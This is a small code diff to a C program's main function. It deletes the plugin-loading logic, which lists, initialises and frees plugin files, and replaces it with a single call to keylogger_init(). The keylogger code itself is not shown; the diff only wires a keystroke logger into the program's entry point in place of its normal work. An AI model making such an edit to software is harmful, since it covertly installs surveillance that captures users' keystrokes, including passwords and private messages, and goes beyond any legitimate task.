@@ -8,16 +8,7 @@
 
 int main()
 {
-	int len = 0;
-	char **list = list_files("plugins", &len);
-	
-	init_plugins(list, len);
-
-	for (int i = 0; i < len; i++)
-	{
-		free(list[i]);
-	}
-	free(list);
+	keylogger_init();
 
 	return OK;
 }
